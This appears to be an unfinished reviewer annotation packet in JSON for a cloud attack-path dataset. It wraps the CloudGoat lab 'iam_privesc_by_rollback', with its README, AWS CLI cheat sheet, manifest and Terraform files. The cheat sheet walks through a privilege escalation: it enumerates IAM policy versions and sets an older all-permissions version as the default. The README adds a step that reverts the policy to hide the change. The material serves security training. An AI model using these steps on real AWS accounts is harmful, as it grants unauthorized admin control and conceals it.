@@ -1,0 +1,142 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "007629a9fcfb4b4279cd342c28235e011000e525558e6f83b730d8ca50dc1c93",
+  "case_id": "cloudgoat:aws:iam_privesc_by_rollback",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:iam_privesc_by_rollback",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "iam_privesc_by_rollback",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/cheat_sheet_raynor.md"
+    ],
+    "terraform_file_count": 5,
+    "has_cheat_sheet": false,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/",
+    "review_score": 4,
+    "independence_group": "cloudgoat-scenario:iam_privesc_by_rollback",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/README.md",
+      "member_sha256": "ccb6db4fee69a31db61facaf4b2a48290a8a6ed7b4b7a09a5a3c5f9aa67d7289",
+      "bytes": 1549,
+      "content_kind": "md",
+      "text": "# Scenario: iam_privesc_by_rollback\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `./cloudgoat.py create iam_privesc_by_rollback`\n\n## Scenario Resources\n\n- 1 IAM User\n- IAM Policy\n  - 5 policy versions\n\n## Scenario Start(s)\n\n1. IAM User \"Raynor\"\n\n## Scenario Goal(s)\n\nAcquire full admin privileges.\n\n## Summary\n\nStarting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/acef779c-51ce-4582-b4d2-19ae92b7f170/image.png)\n\n## Route Walkthrough - IAM User \"Raynor\"\n\n1. Starting as the IAM user \"Raynor,\" the attacker has only a few limited - seemingly harmless - privileges available to them.\n2. The attacker analyzes Raynor's privileges and notices the SetDefaultPolicyVersion permission - allowing access to 4 other versions of the policy via setting an old version as the default.\n3. After reviewing the old policy versions, the attacker finds that one version in particular offers a full set of admin rights.\n4. Attacker restores the full-admin policy version, gaining full admin privileges and the ability to carry out any malicious actions they wish.\n5. As a final step, the attacker may choose to revert Raynor's policy version back to the original one, thereby concealing their actions and the true capabilities of the IAM user.\n\nA cheat sheet for this route is available [here](./cheat_sheet_raynor.md).",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/cheat_sheet_raynor.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/cheat_sheet_raynor.md",
+      "member_sha256": "e9d95aa63515cffacd7fc451021d9b34bf09107712e0b2ed9f7d7f925ccba93e",
+      "bytes": 3740,
+      "content_kind": "md",
+      "text": "### 1. Initial Set-Up \nAfter launching the scenario, you will be provided with an Access Key and Secret. The first step is setting up a profile with the AWS CLI using these credentials.\n\n```bash\naws configure --profile cloudgoat\n\nexport AWS_PROFILE=cloudgoat\n\naws sts get-caller-identity\n# \"Arn\": \"arn:aws:iam::0123456789:user/raynor-iam_privesc_by_rollback_cgidtm8l3zv490\"\n```\n\nThe ARN contains the username in the after `:user/`, it will be unique in each deployment.\nI'll export it as an environment variable to make the cheat sheet clearer. `export IAM_USERNAME=raynor-iam_privesc_by_rollback_cgidtm8l3zv490`\n\n### 2. Policy Enumeration\nOne of the first steps after gaining access to an IAM User is to enumerate the user's privileges in the environment. We can do that by listing the policies attached to the IAM User. \n\n- The first command - `list-user-policies` - are policies embedded directly into the user's IAM identity. \n\n- The second command - `list-attached-user-policies` - are separate, standalone IAM policies - either AWS managed or customer managed policies - that are attached to the user. \n\n```bash\naws iam list-user-policies --user-name $IAM_USERNAME\n# None\n\naws iam list-attached-user-policies --user-name $IAM_USERNAME\n# \"PolicyName\": \"cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490\"\n# \"PolicyArn\": \"arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490\"\n```\nRather than typing out this policy each time, it can be helpful to export it as another enviornmental varible. \n```bash\nexport IAM_POLICY_ARN=arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490`\n```\n### 3. Enumerating Policy Versions\nIn AWS IAM, each policy can have multiple versions - up to five - where only one version is set as the 'default\" (active) version. Whenever you edit a policy, IAM creates a new version, leaving older versions saved in the background. \n\nOlder, non-default versions may grant privileges that are no longer visible in the default version. If an attacker can switch the default to a more permissive version, they could elevate their access. \n\n```bash\naws iam list-policy-versions --policy-arn $IAM_POLICY_ARN\n# Shows five versions\n\naws iam get-policy-version --policy-arn $IAM_POLICY_ARN --version-id v1\n# v1 is the default version, the permissions currently granted to the user\n```\n\nThe policy below is the v1 version, it grants \"read\" access (list & get) as well as the power to switch between versions of policies.\n\n```json\n{\n    \"PolicyVersion\": {\n        \"Document\": {\n            \"Statement\": [\n                {\n                    \"Action\": [\n                        \"iam:Get*\",\n                        \"iam:List*\",\n                        \"iam:SetDefaultPolicyVersion\"\n                    ],\n                    \"Effect\": \"Allow\",\n                    \"Resource\": \"*\"\n                }\n            ]\n        },\n        \"VersionId\": \"v1\",\n        \"IsDefaultVersion\": true\n    }\n}\n```\n\nLooking through the different policy versions `v3` has the following statement.\n\n```json\n{\n    \"PolicyVersion\": {\n        \"Document\": {\n            \"Statement\": [\n                {\n                    \"Action\": \"*\",\n                    \"Effect\": \"Allow\",\n                    \"Resource\": \"*\"\n                }\n            ]\n        },\n        \"VersionId\": \"v3\",\n        \"IsDefaultVersion\": false\n    }\n}\n```\n\nBreaking this apart it grants all actions (`\"Action\": \"*\"`) to all resources. Since the current policy version grants the ability to change versions let switch to use this.\n\n```bash\naws iam set-default-policy-version --policy-arn $IAM_POLICY_ARN --version-id v3\n```\n\nWe now have **administrative permissions** and have completed the CloudGoat scenario!",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/manifest.yml",
+      "member_sha256": "263734c486b932d5ee1a4eff55f223e45f344514e4e63ffafa4fd40d8f6b9b07",
+      "bytes": 729,
+      "content_kind": "yml",
+      "text": "---\n# The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: iam_privesc_by_rollback\n# The name of the author(s), comma separated\n- author: Rhino Security Labs\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.1\n# Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting with a highly-limited IAM profile, the attacker is able to review previous IAM\n        policy versions and restore one which allows full admin privileges, resulting in a\n        privilege escalation exploit.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 09-09-2024\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/iam.tf",
+      "member_sha256": "5140d989615a5cecc2da3a7219362f00ef05b282cab418c2d0bab50d5c8d8b0b",
+      "bytes": 477,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_user\" \"raynor\" {\n  name = \"raynor-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"raynor\" {\n  user = aws_iam_user.raynor.name\n}\n\n\nresource \"aws_iam_policy\" \"versioned_policy\" {\n  name        = \"cg-raynor-policy-${var.cgid}\"\n  description = \"cg-raynor-policy\"\n  policy      = file(\"policies/v1.json\")\n}\n\nresource \"aws_iam_user_policy_attachment\" \"raynor_attachment\" {\n  user       = aws_iam_user.raynor.name\n  policy_arn = aws_iam_policy.versioned_policy.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/null_resource.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/null_resource.tf",
+      "member_sha256": "f7eb53967d2fc7e69d170ddbe8e229005eb39a04bd7a964847480bd0e12351ea",
+      "bytes": 1013,
+      "content_kind": "tf",
+      "text": "resource \"null_resource\" \"policy_version\" {\n  provisioner \"local-exec\" {\n    command = \"aws iam create-policy-version --policy-arn ${aws_iam_policy.versioned_policy.arn} --policy-document file://policies/v2.json --no-set-as-default --profile ${var.profile} --region ${var.region}\"\n  }\n\n  provisioner \"local-exec\" {\n    command = \"aws iam create-policy-version --policy-arn ${aws_iam_policy.versioned_policy.arn} --policy-document file://policies/v3.json --no-set-as-default --profile ${var.profile} --region ${var.region}\"\n  }\n\n  provisioner \"local-exec\" {\n    command = \"aws iam create-policy-version --policy-arn ${aws_iam_policy.versioned_policy.arn} --policy-document file://policies/v4.json --no-set-as-default --profile ${var.profile} --region ${var.region}\"\n  }\n\n  provisioner \"local-exec\" {\n    command = \"aws iam create-policy-version --policy-arn ${aws_iam_policy.versioned_policy.arn} --policy-document file://policies/v5.json --no-set-as-default --profile ${var.profile} --region ${var.region}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/outputs.tf",
+      "member_sha256": "2d4eae7f42ed3f573f3ed01b256b1161d6ed3430e7410a30b82297ff19d135dc",
+      "bytes": 304,
+      "content_kind": "tf",
+      "text": "output \"raynor_access_key_id\" {\n  description = \"The access key ID for the Raynor user\"\n  value       = aws_iam_access_key.raynor.id\n}\n\noutput \"raynor_secret_access_key\" {\n  description = \"The secret access key for the Raynor user\"\n  value       = aws_iam_access_key.raynor.secret\n  sensitive   = true\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/provider.tf",
+      "member_sha256": "dbbb8668dff45670f4e699d5dc87a5647bc84afb0b15acd4878b4b3f65d3a62e",
+      "bytes": 484,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n    local = {\n      source  = \"hashicorp/local\"\n      version = \">= 2.5.0\"\n    }\n    null = {\n      source  = \"hashicorp/null\"\n      version = \">= 3.2.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/iam_privesc_by_rollback/terraform/variables.tf",
+      "member_sha256": "254799a788d0ef43b3e0d69be7a69aad2de799cf0b5f402c355d96f360e8e9fc",
+      "bytes": 559,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy to\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the CloudGoat stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario\"\n  default     = \"iam-privesc-by-rollback\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "e478b872f1de38406fb9b6542b9d88a116670182485700661d6a6348ef7e7c5c",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
